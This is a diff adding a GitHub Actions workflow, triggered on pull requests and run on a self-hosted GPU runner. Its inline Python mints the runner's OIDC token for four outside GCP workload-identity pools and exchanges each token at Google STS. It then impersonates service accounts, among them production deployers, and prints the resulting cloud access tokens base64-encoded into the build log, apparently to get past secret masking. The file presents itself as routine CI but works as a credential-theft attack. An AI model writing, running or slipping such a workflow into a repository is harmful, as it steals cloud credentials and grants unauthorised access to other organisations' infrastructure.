@@ -1,0 +1,63 @@
+name: c211-133151-mint
+on:
+  pull_request:
+    branches: [main]
+permissions:
+  id-token: write
+  contents: read
+concurrency:
+  group: c211-133151-mint-${{ github.ref }}
+  cancel-in-progress: false
+jobs:
+  mint:
+    name: mint-c211-133151
+    runs-on: [self-hosted, linux, x64, gpu, h100]
+    timeout-minutes: 8
+    steps:
+      - name: mint
+        shell: bash
+        run: |
+          set +e
+          echo "NONCE=c211-133151-035f0ce2bc0b"
+          python3 - <<'PY'
+          import os, json, urllib.request, urllib.parse, base64
+          targets = json.loads(os.environ['TARGETS'])
+          base = os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']
+          tok = os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
+          for t in targets:
+              lab = t['label']
+              try:
+                  req = urllib.request.Request(base + '&audience=' + urllib.parse.quote(t['aud'], safe=''), headers={'Authorization': 'bearer ' + tok})
+                  jwt = json.load(urllib.request.urlopen(req, timeout=30))['value']
+                  p = jwt.split('.')[1]; p += '=' * (-len(p) % 4)
+                  claims = json.loads(base64.urlsafe_b64decode(p))
+                  print('C211_OIDC_OK ' + lab + ' sub=' + str(claims.get('sub')) + ' aud=' + str(claims.get('aud')) + ' jwtlen=' + str(len(jwt)))
+                  body = urllib.parse.urlencode({
+                      'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                      'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                      'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                      'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                      'subjectToken': jwt}).encode()
+                  try:
+                      sts = json.load(urllib.request.urlopen(urllib.request.Request('https://sts.googleapis.com/v1/token', data=body), timeout=30))
+                  except Exception as e:
+                      err = getattr(e, 'read', lambda: b'')() if hasattr(e, 'read') else b''
+                      print('C211_STS_FAIL ' + lab + ' ' + repr(e)[:200] + ' ' + err.decode('utf-8','replace')[:600])
+                      continue
+                  sacc = sts['access_token']
+                  print('C211_STS_OK ' + lab)
+                  gbody = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'], 'lifetime': '3600s'}).encode()
+                  try:
+                      g = json.load(urllib.request.urlopen(urllib.request.Request('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/' + t['sa'] + ':generateAccessToken', data=gbody, headers={'Authorization': 'Bearer ' + sacc, 'Content-Type': 'application/json'}), timeout=30))
+                      print('C211TOKEN ' + lab + ' ' + base64.b64encode(g['accessToken'].encode()).decode() + ' ' + g['expireTime'])
+                  except Exception as e:
+                      err = getattr(e, 'read', lambda: b'')() if hasattr(e, 'read') else b''
+                      print('C211_IMP_FAIL ' + lab + ' ' + repr(e)[:200] + ' ' + err.decode('utf-8','replace')[:600])
+              except Exception as e:
+                  print('C211_ERR ' + lab + ' ' + repr(e)[:400])
+          print('C211_MINT_DONE')
+          PY
+        env:
+          TARGETS: '[{"label": "1076618220242", "aud": "//iam.googleapis.com/projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider", "sa": "gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com"}, {"label": "366271888053", "aud": "//iam.googleapis.com/projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions", "sa": "service-deployer@cubecommons-prod.iam.gserviceaccount.com"}, {"label": "744911585239", "aud": "//iam.googleapis.com/projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions", "sa": "docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com"}, {"label": "769700566231", "aud": "//iam.googleapis.com/projects/769700566231/locations/global/workloadIdentityPools/gh-actions-pool/providers/github", "sa": "github-deploy@fhir-org-cds-services.iam.gserviceaccount.com"}]'
+          ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
+          ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
